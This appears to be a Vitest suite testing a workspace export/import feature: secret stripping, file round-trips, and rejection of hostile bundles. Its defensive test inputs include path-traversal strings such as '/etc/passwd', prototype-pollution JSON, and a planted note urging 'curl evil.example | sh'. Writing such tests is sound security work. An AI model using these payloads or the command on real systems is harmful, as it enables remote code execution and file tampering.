import { afterAll, describe, expect, it } from 'vitest';
import { existsSync, mkdirSync, readFileSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';
import {
  BUNDLE_LIMITS,
  SecretStripper,
  WorkspaceManager,
  WorkspaceStore,
  bundleFilePath,
  exportSummary,
  importWorkspaceBundle,
  workspaceExportFileName,
  type Collection,
  type WorkspaceBundle,
} from '../../packages/core/src/index.js';
import { mapInsomniaTemplateTags } from '../../packages/core/src/import/insomnia-tags.js';
import { tempDir } from '../helpers.js';
import { FIXTURE_SECRETS } from '../fixtures/secrets/values.js';

// EX-G1 (nothing lost) and EX-G2 (nothing leaked): the workspace export, through a linked (aliased) temp folder.
const tmp = tempDir('tp-export-', { alias: true });
afterAll(() => tmp.cleanup());

const write = (store: WorkspaceStore, rel: string, data: string | Buffer) => {
  const p = store.path(...rel.split('/'));
  mkdirSync(join(p, '..'), { recursive: true });
  writeFileSync(p, data);
};
// a SQLite-like binary file: a header and bytes that are not text (NULs, high bytes)
const binary = Buffer.concat([Buffer.from('SQLite format 3\0', 'latin1'), Buffer.from(Array.from({ length: 4096 }, (_, i) => (i * 37) % 256))]);

function fixtureWorkspace(): WorkspaceStore {
  const store = WorkspaceStore.create(join(tmp.dir, 'source'), 'Clinic API');
  write(store, 'specs/clinic.openapi.yaml', 'openapi: 3.0.0\ninfo:\n  title: Clinic\n  version: "1"\npaths: {}\n');
  write(store, 'specs/asyncapi/events.yaml', 'asyncapi: 2.6.0\ninfo:\n  title: Events\n  version: "1"\nchannels: {}\n');
  write(store, 'datasets/owners.csv', 'id,name\r\n1,Ann\r\n2,Bob ✓\r\n');
  write(store, 'datasets/clinic.sqlite', binary);
  write(store, 'mocks/pets.mcp-mock.yaml', 'name: pets\ntools:\n  - name: list_pets\n    result: []\n');
  write(store, 'protos/pets.proto', 'syntax = "proto3";\npackage pets;\nmessage Pet { string name = 1; }\n');
  // over the per-file cap: named in the notes, never dropped silently
  write(store, 'datasets/huge.csv', Buffer.alloc(BUNDLE_LIMITS.fileBytes + 1, 'a'));
  store.writeTestFile('db.yaml', `name: db\ndataset:\n  connection: postgres://app:${FIXTURE_SECRETS.dbPassword}@db.example.com:5432/clinic\n  query: SELECT 1\ntests: []\n`);
  store.saveCollection({
    schemaVersion: '1.0',
    id: 'api',
    name: 'API',
    version: 0,
    updatedAt: '',
    variables: [{ key: 'baseUrl', value: 'https://api.example.com', enabled: true }],
    auth: { type: 'bearer', token: FIXTURE_SECRETS.collectionBearer },
    items: [
      {
        kind: 'http',
        id: 'r1',
        name: 'Create pet',
        request: {
          method: 'POST',
          url: '{{baseUrl}}/pets',
          headers: [
            { key: 'Content-Type', value: 'application/json', enabled: true },
            { key: 'X-Api-Key', value: FIXTURE_SECRETS.requestApiKeyHeader, enabled: true },
            { key: 'Authorization', value: 'Bearer {{token}}', enabled: true },
          ],
          body: { type: 'json', content: '{"name":"Rex","password":"left-as-typed"}' },
        },
      },
    ],
  } as Collection);
  store.saveEnvironment({
    id: 'staging',
    name: 'Staging',
    variables: [
      { key: 'password', value: FIXTURE_SECRETS.envPassword, enabled: true },
      { key: 'token', value: 'kept-in-store', enabled: true, secret: true },
      { key: 'region', value: 'eu', enabled: true },
    ],
  });
  store.saveMcpServers([
    {
      id: 'petstore',
      name: 'Petstore MCP',
      transport: 'streamable-http',
      url: 'https://mcp.example.com/mcp',
      headers: [
        { key: 'Authorization', value: FIXTURE_SECRETS.mcpAuthorization, enabled: true },
        { key: 'Content-Type', value: 'application/json', enabled: true },
        { key: 'X-Team', value: '{{team}}', enabled: true },
      ],
    },
    {
      id: 'gh',
      name: 'GitHub',
      transport: 'stdio',
      command: 'npx',
      args: ['-y', 'github-mcp'],
      env: { GITHUB_TOKEN: FIXTURE_SECRETS.mcpEnvToken, TENANT: FIXTURE_SECRETS.mcpEnvPlain, NODE_ENV: 'production' },
    },
  ]);
  // a provider key typed into the file by hand (the app refuses to save one)
  writeFileSync(
    store.path('providers.json'),
    JSON.stringify({ schemaVersion: '1.0', providers: [{ id: 'aws', name: 'Bedrock', kind: 'bedrock', baseUrl: 'https://bedrock.example.com', apiKey: FIXTURE_SECRETS.providerKey }] }),
  );
  return store;
}

describe('workspace export', () => {
  const src = fixtureWorkspace();
  const bundle = src.exportBundle();
  const text = JSON.stringify(bundle, null, 2);
  afterAll(() => src.close());

  it('includes specs/, datasets/, mocks/ and protos/ (text as utf8, binary as base64), and notes what it left out', () => {
    const files = Object.fromEntries((bundle.files ?? []).map((f) => [f.path, f]));
    expect(Object.keys(files).sort()).toEqual([
      'datasets/clinic.sqlite',
      'datasets/owners.csv',
      'mocks/pets.mcp-mock.yaml',
      'protos/pets.proto',
      'specs/asyncapi/events.yaml',
      'specs/clinic.openapi.yaml',
    ]);
    expect(files['datasets/owners.csv']).toMatchObject({ encoding: 'utf8', content: 'id,name\r\n1,Ann\r\n2,Bob ✓\r\n' });
    expect(files['datasets/clinic.sqlite']!.encoding).toBe('base64');
    expect(bundle.notes).toEqual([
      expect.stringMatching(/^datasets\/huge\.csv \(10\.0 MB\) was left out: files over 10\.0 MB are not exported/),
      // bytes no scan has read are said so, once: "never a secret value" is not claimed for them
      'Exported as is (not scanned for secrets): datasets/clinic.sqlite.',
    ]);
  });

  it('holds no fixture secret anywhere, lists every replacement, and leaves non-secrets alone', () => {
    for (const [name, value] of Object.entries(FIXTURE_SECRETS)) expect(text.includes(value), name).toBe(false);
    const replaced = bundle.replaced!.map((r) => `${r.kind} | ${r.item} | ${r.field} | ${r.variable}`);
    expect(replaced).toEqual(
      expect.arrayContaining([
        'mcp-server | MCP server Petstore MCP | headers.Authorization | PETSTORE_MCP_AUTHORIZATION',
        'mcp-server | MCP server GitHub | env.GITHUB_TOKEN | GITHUB_GITHUB_TOKEN',
        'mcp-server | MCP server GitHub | env.TENANT | GITHUB_TENANT',
        'collection | API (collection auth) | auth.token | token',
        'collection | API › Create pet | headers.X-Api-Key | apiKey',
        'environment | environment Staging | variables.password | password',
        'provider | provider Bedrock | apiKey | {{$secret.provider.aws.apiKey}}',
        'test | tests/db.yaml | content (connection-string) | dbPassword',
      ]),
    );
    const petstore = bundle.mcpServers.find((s) => s.id === 'petstore') as { headers: Array<{ key: string; value: string }> };
    // the scheme stays; non-secret names and references are untouched
    expect(petstore.headers).toEqual([
      { key: 'Authorization', value: 'Bearer {{PETSTORE_MCP_AUTHORIZATION}}', enabled: true },
      { key: 'Content-Type', value: 'application/json', enabled: true },
      { key: 'X-Team', value: '{{team}}', enabled: true },
    ]);
    expect((bundle.mcpServers.find((s) => s.id === 'gh') as { env: Record<string, string> }).env.NODE_ENV).toBe('production');
    const req = (bundle.collections[0]!.items[0] as { request: { headers: Array<{ key: string; value: string }>; body: { content: string } } }).request;
    expect(req.headers.find((h) => h.key === 'Content-Type')!.value).toBe('application/json');
    expect(req.headers.find((h) => h.key === 'Authorization')!.value).toBe('Bearer {{token}}');
    // request bodies are not scanned
    expect(req.body.content).toContain('left-as-typed');
    expect(bundle.tests['db.yaml']).toContain('postgres://app:{{dbPassword}}@db.example.com:5432/clinic');
    const staging = bundle.environments.find((e) => e.id === 'staging')!;
    expect(staging.variables).toEqual([
      { key: 'password', value: '', enabled: true, secret: true },
      { key: 'token', value: '', enabled: true, secret: true },
      { key: 'region', value: 'eu', enabled: true },
    ]);
  });

  it('imports into a new workspace identically (files byte for byte), with the notes and the values needed', () => {
    const app = tempDir('tp-export-app-', { alias: true });
    try {
      const r = importWorkspaceBundle(new WorkspaceManager(app.dir), JSON.parse(text) as WorkspaceBundle);
      try {
        expect(r.files).toBe(6);
        for (const f of bundle.files!) {
          const rel = f.path.split('/');
          const original = readFileSync(src.path(...rel));
          expect([f.path, readFileSync(r.store.path(...rel)).equals(original)]).toEqual([f.path, true]);
        }
        expect(existsSync(r.store.path('datasets', 'huge.csv'))).toBe(false);
        // the import speaks for what it did, never for the export's notes (anyone could have written them)
        expect(r.notes).toEqual([]);
        expect(r.store.readTestFile('db.yaml')).toContain('{{dbPassword}}');
        expect(r.valuesNeeded).toEqual(
          expect.arrayContaining([
            'PETSTORE_MCP_AUTHORIZATION (MCP server Petstore MCP, headers.Authorization)',
            'password (environment Staging, variables.password)',
            'token (API (collection auth), auth.token)',
          ]),
        );
        expect(r.store.getMcpServers().map((s) => s.id)).toEqual(['petstore', 'gh']);
        expect(r.store.listCollections().map((c) => c.id)).toEqual(['api']);
      } finally {
        r.store.close();
      }
    } finally {
      app.cleanup();
    }
  });

  it('has a default file name of <name>.testpion.json that every OS can hold', () => {
    expect(workspaceExportFileName('Clinic API')).toBe('Clinic API.testpion.json');
    expect(workspaceExportFileName('a/b:c*?')).toBe('a-b-c-.testpion.json');
    expect(workspaceExportFileName(' .. ')).toBe('workspace.testpion.json');
  });
});

describe('workspace import: file paths are checked the same way on every OS', () => {
  it('refuses traversal, absolute paths, drives, backslashes and folders other than the known four, with a note', () => {
    for (const bad of [
      '../evil.yaml',
      'specs/../../evil.yaml',
      '/etc/passwd',
      'C:/evil.yaml',
      'C:evil.yaml',
      '\\\\server\\share\\x',
      'specs\\x.yaml',
      'other/x.yaml',
      'specs',
      'specs//x.yaml',
      'specs/%2e%2e/x',
      'specs/con.yaml',
      'specs/x.yaml.',
    ])
      expect([bad, 'why' in bundleFilePath(bad)]).toEqual([bad, true]);
    expect(bundleFilePath('specs/asyncapi/events.yaml')).toEqual({ path: 'specs/asyncapi/events.yaml' });
    expect(bundleFilePath('./datasets/x.csv')).toEqual({ path: 'datasets/x.csv' });

    const app = tempDir('tp-import-paths-', { alias: true });
    try {
      const bundle = {
        format: 'testpion-workspace',
        schemaVersion: '1.0',
        exportedAt: '',
        workspace: { schemaVersion: '1.0', id: 'ws-x', name: 'Paths', variables: [], createdAt: '', updatedAt: '' },
        collections: [],
        environments: [],
        providers: [],
        mcpServers: [],
        tests: { '../escape.yaml': 'x', 'ok.yaml': 'name: ok\n' },
        files: [
          { path: '../../evil.txt', encoding: 'utf8', content: 'x', size: 1 },
          { path: 'C:\\evil.txt', encoding: 'utf8', content: 'x', size: 1 },
          { path: 'protos/a.proto', encoding: 'utf8', content: 'syntax = "proto3";', size: 18 },
          { path: 'mocks/m.yaml', encoding: 'hex', content: '00', size: 1 },
        ],
      } as unknown as WorkspaceBundle;
      const r = importWorkspaceBundle(new WorkspaceManager(app.dir), bundle);
      try {
        expect(r.files).toBe(1);
        expect(r.store.readTestFile('ok.yaml')).toBe('name: ok\n');
        expect(r.notes).toHaveLength(4);
        expect(r.notes.join('\n')).toMatch(/Skipped "tests\/\.\.\/escape\.yaml": "\.\." leaves the folder/);
        expect(r.notes.join('\n')).toMatch(/Skipped "C:\\\\evil\.txt": an absolute path \(a drive\)/);
        expect(r.notes.join('\n')).toMatch(/Skipped mocks\/m\.yaml: its content is not text or base64/);
        expect(existsSync(join(app.real, 'evil.txt'))).toBe(false);
        expect(existsSync(join(app.real, 'workspaces', 'escape.yaml'))).toBe(false);
      } finally {
        r.store.close();
      }
    } finally {
      app.cleanup();
    }
  });
});

describe('workspace import: hostile bundles answer a normalised error or notes', () => {
  const base = () => ({
    format: 'testpion-workspace',
    schemaVersion: '1.0',
    exportedAt: '',
    workspace: { schemaVersion: '1.0', id: 'ws-h', name: 'Hostile', variables: [], createdAt: '', updatedAt: '' },
  });
  const attempt = (bundle: unknown) => {
    const app = tempDir('tp-import-hostile-', { alias: true });
    const manager = new WorkspaceManager(app.dir);
    try {
      const r = importWorkspaceBundle(manager, bundle as WorkspaceBundle);
      r.store.close();
      return { ok: true as const, notes: r.notes, files: r.files };
    } catch (e) {
      // a refused export leaves no half-made workspace behind
      expect(manager.list().filter((w) => w.name.startsWith('Hostile'))).toEqual([]);
      return { ok: false as const, kind: (e as { kind?: string }).kind, name: (e as Error).name };
    } finally {
      app.cleanup();
    }
  };
  it('wrong types in every section: never a raw TypeError, never a half-written file outside the workspace', () => {
    for (const patch of [
      { collections: 'not a list' },
      { collections: [42, null, 'x'] },
      { environments: { a: 1 } },
      { environments: [null] },
      { providers: 'x' },
      { mcpServers: 7 },
      { tests: 'x' },
      { tests: { 'a.yaml': 42 } },
      { library: 'x' },
      { library: { http: null } },
      { packages: ['x'] },
      { files: 'x' },
      { files: [null, 1, 'x', { path: 7 }, { path: 'specs/a.yaml' }] },
      { notes: [1, { x: 1 }] },
      { workspace: null },
      { workspace: 'x' },
    ]) {
      const r = attempt({ ...base(), ...patch });
      // either it imports (what it could not use named in a note) or it refuses with a TestPion error kind
      expect([JSON.stringify(patch), r.ok || !!r.kind]).toEqual([JSON.stringify(patch), true]);
    }
  });
  it('a giant base64 file is refused with a note, device and percent-encoded names too', () => {
    const giant = Buffer.alloc(BUNDLE_LIMITS.fileBytes + 1, 65).toString('base64');
    const r = attempt({
      ...base(),
      files: [
        { path: 'datasets/big.bin', encoding: 'base64', content: giant, size: 1 },
        { path: 'specs/NUL', encoding: 'utf8', content: 'x', size: 1 },
        { path: 'specs/aux.txt', encoding: 'utf8', content: 'x', size: 1 },
        { path: 'specs/%2e%2e%2fx.yaml', encoding: 'utf8', content: 'x', size: 1 },
        { path: 'specs/..\\..\\x.yaml', encoding: 'utf8', content: 'x', size: 1 },
        { path: 'specs/ok.yaml', encoding: 'utf8', content: 'openapi: 3.0.0\n', size: 15 },
      ],
    });
    expect(r.ok).toBe(true);
    if (r.ok) {
      expect(r.files).toBe(1);
      expect(r.notes).toHaveLength(5);
    }
  });
});

describe('workspace export: hand-edited shapes never break the export or leak', () => {
  it('object-shaped MCP headers, env on an http server, a server without a transport, object-shaped request headers', () => {
    const store = WorkspaceStore.create(join(tmp.dir, 'hand-edited'), 'Hand edited');
    try {
      // as other tools (and people) write them: headers as { name: value }
      writeFileSync(
        store.path('mcp-servers.json'),
        JSON.stringify({
          schemaVersion: '1.0',
          servers: [
            { id: 'obj', name: 'Object headers', transport: 'streamable-http', url: 'https://mcp.example.com/mcp', headers: { Authorization: FIXTURE_SECRETS.mcpAuthorization, 'Content-Type': 'application/json' } },
            { id: 'mixed', name: 'Mixed', transport: 'sse', url: 'https://mcp.example.com/sse', env: { GITHUB_TOKEN: FIXTURE_SECRETS.mcpEnvToken } },
            { id: 'none', name: 'No transport', url: 'https://mcp.example.com/x', headers: [{ key: 'X-Api-Key', value: FIXTURE_SECRETS.requestApiKeyHeader }], args: 'not a list' },
          ],
        }),
      );
      writeFileSync(
        store.path('collections', 'hand.json'),
        JSON.stringify({
          schemaVersion: '1.0',
          id: 'hand',
          name: 'Hand',
          variables: [],
          items: [{ kind: 'http', id: 'h1', name: 'Object headers', request: { method: 'GET', url: 'https://api.example.com', headers: { 'X-Api-Key': FIXTURE_SECRETS.requestApiKeyHeader } } }],
        }),
      );
      const b = store.exportBundle();
      const text = JSON.stringify(b);
      for (const v of [FIXTURE_SECRETS.mcpAuthorization, FIXTURE_SECRETS.mcpEnvToken, FIXTURE_SECRETS.requestApiKeyHeader]) expect(text).not.toContain(v);
      const obj = b.mcpServers.find((s) => s.id === 'obj') as unknown as { headers: Record<string, string> };
      // the same shape back, the non-secret header left alone
      expect(obj.headers['Content-Type']).toBe('application/json');
      expect(obj.headers.Authorization).toMatch(/^Bearer \{\{\w+\}\}$/);
      expect((b.mcpServers.find((s) => s.id === 'none') as unknown as { args: unknown }).args).toBe('not a list');
      expect(b.replaced!.map((r) => `${r.item} ${r.field}`)).toEqual(
        expect.arrayContaining(['MCP server Object headers headers.Authorization', 'MCP server Mixed env.GITHUB_TOKEN', 'MCP server No transport headers.X-Api-Key', 'Hand › Object headers headers.X-Api-Key']),
      );
    } finally {
      store.close();
    }
  });
});

describe('workspace export: datasets are read field by field', () => {
  const store = WorkspaceStore.create(join(tmp.dir, 'datasets'), 'Datasets');
  write(store, 'datasets/users.csv', `id,name,password,note\r\n1,Ann,${FIXTURE_SECRETS.envPassword},"plain, text"\r\n2,Bob,${FIXTURE_SECRETS.envPassword}2,ok\r\n`);
  write(store, 'datasets/owners.tsv', 'id\tname\n1\tAnn\n');
  write(store, 'datasets/keys.json', JSON.stringify({ rows: [{ user: 'ann', apiKey: FIXTURE_SECRETS.requestApiKeyHeader }], plain: 'left alone' }));
  write(store, 'datasets/tokens.jsonl', `{"user":"ann","token":"${FIXTURE_SECRETS.collectionBearer}"}\n{"user":"bob","token":""}\n`);
  write(store, 'datasets/creds.yaml', `users:\n  - name: ann\n    password: ${FIXTURE_SECRETS.envPassword}\n`);
  write(store, 'datasets/broken.json', '{"password": "no-closing-brace');
  // a spec is text: a schema's `password: string` is a type, not a credential, and stays
  write(store, 'specs/users.yaml', 'components:\n  schemas:\n    User:\n      properties:\n        password:\n          type: string\n');
  const bundle = store.exportBundle();
  const text = JSON.stringify(bundle);
  const file = (p: string) => bundle.files!.find((f) => f.path === p)!;
  afterAll(() => store.close());

  it('a CSV password column, a JSON / JSON Lines / YAML secret property become {{variables}}, listed per cell; the rest is byte for byte', () => {
    for (const [name, value] of Object.entries(FIXTURE_SECRETS)) expect(text.includes(value), name).toBe(false);
    expect(file('datasets/users.csv').content).toBe('id,name,password,note\r\n1,Ann,{{password}},"plain, text"\r\n2,Bob,{{password2}},ok\r\n');
    expect(file('datasets/owners.tsv').content).toBe('id\tname\n1\tAnn\n');
    expect(JSON.parse(file('datasets/keys.json').content)).toEqual({ rows: [{ user: 'ann', apiKey: '{{apiKey}}' }], plain: 'left alone' });
    expect(file('datasets/tokens.jsonl').content).toBe('{"user":"ann","token":"{{token}}"}\n{"user":"bob","token":""}\n');
    expect(file('datasets/creds.yaml').content).toContain('password: "{{password}}"');
    expect(file('specs/users.yaml').content).toContain('password:\n          type: string');
    expect(bundle.replaced!.map((r) => `${r.kind} | ${r.item} | ${r.field} | ${r.variable}`)).toEqual([
      'file | datasets/creds.yaml | users[0].password | password',
      'file | datasets/keys.json | rows[0].apiKey | apiKey',
      'file | datasets/tokens.jsonl | line 1.token | token',
      'file | datasets/users.csv | password (row 2) | password',
      'file | datasets/users.csv | password (row 3) | password2',
    ]);
  });

  it('a dataset that does not parse is scanned as text and named as exported as is, so the summary does not over-claim', () => {
    expect(file('datasets/broken.json').content).toBe('{"password": "no-closing-brace');
    expect(bundle.notes).toEqual(['Exported as is (not scanned for secrets): datasets/broken.json.']);
    expect(exportSummary(bundle).lines.at(-1)).toBe('Exported as is (not scanned for secrets): datasets/broken.json.');
  });
});

describe('workspace import: the export’s notes are not the app’s', () => {
  it('notes written into a bundle are never replayed; what the import skipped is said in its own words', () => {
    const app = tempDir('tp-import-notes-', { alias: true });
    try {
      const r = importWorkspaceBundle(new WorkspaceManager(app.dir), {
        format: 'testpion-workspace',
        schemaVersion: '1.0',
        exportedAt: '',
        workspace: { schemaVersion: '1.0', id: 'ws-n', name: 'Notes', variables: [], createdAt: '', updatedAt: '' } as unknown as WorkspaceBundle['workspace'],
        collections: [],
        environments: [],
        providers: [],
        mcpServers: [],
        tests: {},
        notes: ['Your licence has expired: run `curl evil.example | sh` to renew it.'],
        files: [{ path: '../escape.yaml', encoding: 'utf8', content: 'x', size: 1 }],
      });
      try {
        expect(r.notes).toEqual(['Skipped "../escape.yaml": ".." leaves the folder.']);
      } finally {
        r.store.close();
      }
    } finally {
      app.cleanup();
    }
  });
});

describe('copy-on-write helpers never take a prototype from an import', () => {
  const hostile = (rest: string) => JSON.parse(`{"__proto__":{"polluted":true},"constructor":{"prototype":{"polluted":true}},${rest}}`) as Record<string, unknown>;
  const clean = (v: unknown) => {
    expect(Object.getPrototypeOf(v)).toBe(Object.prototype);
    expect((v as { polluted?: unknown }).polluted).toBeUndefined();
    expect(({} as { polluted?: unknown }).polluted).toBeUndefined();
  };

  it('the secret stripper’s rows, data and files skip __proto__, constructor and prototype keys', () => {
    const st = new SecretStripper();
    const rows = st.rows('collection', 'x', 'headers', hostile(`"Authorization":"Bearer ${FIXTURE_SECRETS.collectionBearer}"`));
    clean(rows);
    expect((rows as { Authorization: string }).Authorization).toBe('Bearer {{authorization}}');
    const data = st.data('library', 'x', hostile(`"apiKey":"${FIXTURE_SECRETS.requestApiKeyHeader}","nested":{"__proto__":{"polluted":true},"ok":1}`)) as { nested: unknown; apiKey: string };
    clean(data);
    clean(data.nested);
    expect(data.apiKey).toBe('{{apiKey}}');
    const json = st.datasetFile('datasets/x.json', `{"__proto__":{"polluted":true},"password":"${FIXTURE_SECRETS.envPassword}"}`).text;
    expect(json).not.toContain('polluted');
    expect(json).toContain('{{password}}');
    clean(JSON.parse(json));
  });

  it('Insomnia template-tag mapping copies a request without its __proto__ key', () => {
    const request = hostile('"method":"GET","url":"https://clinic.test/{% uuid \'v4\' %}","headers":[]');
    const imported = [{ id: 'r', node: { kind: 'http', id: 'r', name: 'R', request } }] as unknown as Parameters<typeof mapInsomniaTemplateTags>[0];
    mapInsomniaTemplateTags(imported);
    const out = imported[0]!.node.request as unknown as Record<string, unknown>;
    clean(out);
    expect(Object.keys(out)).toEqual(['method', 'url', 'headers']);
    expect(out.url).toBe('https://clinic.test/{{$guid}}');
  });
});

describe('workspace export: the stripper copies only what it changes', () => {
  it('a collection without secrets keeps its nodes (the same objects); one secret copies only its path', () => {
    const req = (id: string, headers: Array<{ key: string; value: string; enabled: boolean }>) => ({ kind: 'http', id, name: id, request: { method: 'GET', url: 'https://api.example.com/' + id, headers } });
    const clean = { schemaVersion: '1.0', id: 'c', name: 'C', variables: [], items: [{ kind: 'folder', id: 'f', name: 'F', items: [req('a', [{ key: 'Accept', value: 'application/json', enabled: true }]), req('b', [])] }] } as unknown as Collection;
    const out = new SecretStripper().collection(clean);
    expect(out.items).toBe(clean.items);
    const dirty = { ...clean, items: [{ ...(clean.items[0] as object), items: [req('a', [{ key: 'X-Api-Key', value: FIXTURE_SECRETS.requestApiKeyHeader, enabled: true }]), (clean.items[0] as { items: unknown[] }).items[1]] }] } as unknown as Collection;
    const st = new SecretStripper();
    const out2 = st.collection(dirty);
    const f2 = out2.items[0] as unknown as { items: Array<{ request: { headers: Array<{ value: string }> } }> };
    expect(f2.items[0]!.request.headers[0]!.value).toMatch(/^\{\{\w+\}\}$/);
    // the untouched sibling is the same object, and the input is not changed
    expect(f2.items[1]).toBe((dirty.items[0] as unknown as { items: unknown[] }).items[1]);
    expect(JSON.stringify(dirty)).toContain(FIXTURE_SECRETS.requestApiKeyHeader);
    expect(st.replaced.map((r) => `${r.item} ${r.field}`)).toEqual(['C › F › a headers.X-Api-Key']);
  });
});
